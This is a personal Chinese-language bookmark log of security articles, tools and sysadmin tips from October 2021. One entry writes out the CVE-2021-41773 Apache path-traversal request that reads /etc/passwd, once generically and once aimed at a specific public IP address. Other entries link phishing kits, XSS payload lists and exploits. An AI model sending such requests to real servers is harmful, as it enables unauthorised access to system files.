# 202110

### 20211028

PortSwigger之XSS实验笔记
https://www.freebuf.com/articles/web/289478.html

利用SCF文件攻击进行渗透实战
https://www.freebuf.com/articles/web/291348.html

web安全101之如何理解XXE？
https://www.freebuf.com/articles/web/291094.html

Tomcat通用回显学习笔记
https://www.anquanke.com/post/id/256966

### 20211027

Apache HTTPd 多个路径穿越与命令执行漏洞（CVE-2021-41773 CVE-2021-42013）
CVE-ID：CVE-2021-41773、CVE-2021-42013
https://github.com/Vulnmachines/cve-2021-41773/blob/main/payload
GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: https://www.twitter.com/vulnmachines
https://httpd.apache.org/security/vulnerabilities_24.html
这怎么容易攻击 吗？
http://125.121.239.10:5000/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

### 20211026

The Docker Bench for Security is a script that checks for dozens of common best-practices around deploying Docker containers in production.
https://github.com/docker/docker-bench-security

很多不错的docker ，包括docker-gui
https://github.com/jessfraz/dockerfiles
https://blog.jessfraz.com/post/docker-containers-on-the-desktop/

钓鱼工具集合
https://github.com/htr-tech/zphisher

Gartner 2022重要技术趋势初探|不是安全趋势
https://www.freebuf.com/articles/neopoints/292596.html

CVE-2021-26084
https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md

http://www.nsfocus.net/index.php?os=&type_id=&keyword=mysql&act=sec_bug&submit=+

如何使用Gorsair入侵远程Docker容器并暴露API
https://www.freebuf.com/articles/container/285669.html

如果虚拟机装chromeOS或是鸿蒙OS，是不是可以实现工作平台与私人平台分开

### 20211025

怎么处理 php 阿里探测造成的高负载

[Nginx 的基础内置变量 / Nginx 重写 url 的模式](https://segmentfault.com/a/1190000022499679)

高负载方案1 然后把SLB上的探测改成 /healthz
```bash
  location /healthz {
        access_log off;
        add_header Content-Type text/plain;
        return 200 "OK";
    }
```

测试 http://xxx/healthz

解决方案2
把 / 请求 302 到 index.php，是不需要请求 index.php

[Nginx葵花宝典—草根站长Nginx运维百科全书](https://zhuanlan.zhihu.com/p/39311377)

= 精确匹配 严格匹配这个查询。如果找到，停止搜索
所以可以
```conf
location = / {
    return 301 "/index.php";
}
```

OpenSSL 缓冲区溢出漏洞（CVE-2021-3711）

OpenSSL发布安全公告，修复了OpenSSL中的一个缓冲区溢出漏洞（CVE-2021-3711）。
该漏洞源于SM2解密代码中EVP_PKEY_decrypt()的边界错误，远程攻击者可通过发送特制的用于解密的SM2内容，触发缓冲区溢出最多62个字节，从而改变进程行为或导致应用崩溃，实现在目标系统上执行任意代码。

```bash
dpkg -l openssl
sudo apt-get install --only-upgrade openssl
```

Ubuntu系统用户： 
查看OpenSSL版本：dpkg -l openssl
升级OpenSSL版本：sudo apt-get install --only-upgrade openssl
1）	Ubuntu 21.04 LTS版本用户，建议升级到如下版本： 1.1.1j-1ubuntu3.5
2）	Ubuntu 20.04 LTS版本用户，建议升级到如下版本： 1.1.1f-1ubuntu2.8
3）	Ubuntu 18.04 LTS版本用户，建议升级到如下版本： 1.1.1-1ubuntu2.1~18.04.13

Raider：一款功能强大的Web身份认证测试框架
https://www.freebuf.com/articles/web/288288.html
https://docs.raiderauth.com/en/latest/

mysql提权总结
https://www.freebuf.com/articles/web/288941.html

红队实战攻防技术（一）
https://www.anquanke.com/post/id/249994

红队实战攻防技术（二）
https://www.freebuf.com/articles/web/290622.html

PortSwigger之不安全的反序列化+服务器端模板注入漏洞笔记
https://www.freebuf.com/articles/web/290701.html

业务安全SDL体历（续）
https://www.freebuf.com/articles/security-management/267371.html

### 20211022
平常看到好的渗透hacking工具和多领域效率工具的集合
https://github.com/taielab/awesome-hacking-lists


### 20211021

https://github.com/payloadbox/xss-payload-list

https://www.kitploit.com/2018/05/xss-payload-list-cross-site-scripting.html

### 20211020

https://paper.seebug.org/1739/
“刷脸时代”你的脸就是我的脸 -- 人脸识别漏洞分析 (上）

https://paper.seebug.org/1740/
“刷脸时代”你的脸就是我的脸 -- 人脸识别漏洞分析 (下）

### 20211018

ATT&CK威胁检测技术在云工作负载的实践
https://www.anquanke.com/post/id/255556

渗透测试之地基服务篇：服务攻防之中间件Tomcat（下） 会员
https://www.freebuf.com/articles/web/287219.html

Qlog：一款功能强大的Windows安全日志工具
https://www.freebuf.com/articles/system/290653.html

A Python based web application scanner to gather OSINT and fuzz for OWASP vulnerabilities on a target website.
https://github.com/1N3/BlackWidow

https://github.com/chennqqi/godnslog/blob/master/README_CN.md
An exquisite dns&http log server for verify SSRF/XXE/RFI/RCE vulnerability

Kali Linux-BeEF浏览器渗透框架
https://blog.csdn.net/weixin_39190897/article/details/104727883

### 20211015
https://github.com/KieSun/all-of-frontend
你想知道的前端内容都在这
https://github.com/twbs/icons
Official open source SVG icon library for Bootstrap.

### 20211011

[Apache HTTP Server 2.4.50 - Path Traversal & Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/50406)

记一次应急响应到溯源入侵者
https://www.freebuf.com/articles/web/289450.html

渗透测试之地基服务篇：服务攻防之中间件Apache（总） 
https://www.freebuf.com/articles/web/285677.html

Linux Security Module逆向分析实战
https://www.freebuf.com/articles/compliance/290450.html

CrowdSec：一个功能强大的行为检测引擎
https://www.freebuf.com/articles/network/290868.html

渗透测试之地基服务篇：服务攻防之中间件Nginx（总）
https://www.freebuf.com/articles/web/285681.html

渗透测试之地基服务篇：服务攻防之中间件Tomcat（上
https://www.freebuf.com/articles/web/287213.html

浅谈云上攻防——SSRF漏洞带来的新威胁
https://www.anquanke.com/post/id/255222

App合规实践3000问
https://www.anquanke.com/post/id/255323

Shiro权限绕过漏洞分析
https://www.anquanke.com/post/id/253749

### 20211011

自签名证书

什么是CSR，CSR文件的作用和生成 http://new.sslchaoshi.com/help/docs/article_54

 Certificate Signing Request 证书签名请求文件
 证书申请者在申请数字证书时由CSP(加密服务提供者)在生成私钥的同时也生成证书请求文件

## 20211010

[Ubuntu(linux)添加系统证书信任](https://blog.csdn.net/chushoutaizhong/article/details/82178511)

[linux系统添加根证书 linux证书信任列表](https://blog.csdn.net/dlgdlg_2008/article/details/71242816)

这里面有java的
Using a self-signed certificate

https://stackoverflow.com/questions/2123362/using-a-self-signed-certificate
https://www.jvt.me/posts/2019/11/28/self-signed-certs-ruby/

## 20211008

https://github.com/teoseller/osquery-attck
https://gitee.com/azhao-1981/osquery-attck

[Linux应急响应指南 #7](https://github.com/AI0TSec/blog/issues/7)

[Introduction To Vulnerability Scanning](https://www.youtube.com/watch?v=fG7HhqEJbTs&list=RDCMUC0ZTPkdxlAKf-V33tqXwi3Q&start_radio=1)

## 20211007

Setting up logrotate in Linux
https://www.redhat.com/sysadmin/setting-logrotate
https://www.redhat.com/sysadmin/log-aggregation-rsyslog
How to use rsyslog to create a Linux log aggregation server

pip3 install code2flow
Pretty good call graphs for dynamic languages
https://github.com/scottrogowski/code2flow/
https://www.honeybadger.io/blog/multi-factor-2fa-authentication-rails-webauthn-devise/
## 20211003

https://github.com/ryanmcdermott/clean-code-javascript

https://github.com/authzed/spicedb
用来设计权限的控制的数据库

https://github.com/Ganapati/RsaCtfTool
RSA attack tool (mainly for ctf) - retreive private key from weak public key and/or uncipher data

https://github.com/appwrite/appwrite
Appwrite is a secure end-to-end backend server for Web, Mobile, and Flutter developers that is packaged as a set of Docker containers for easy deployment 🚀

Graphic notes on Gilbert Strang's "Linear Algebra for Everyone"
https://github.com/kenjihiranabe/The-Art-of-Linear-Algebra

Build completely custom admin panels and internal tools. Use 30+ react components to build pages without HTML/CSS.
https://github.com/appsmithorg/appsmith

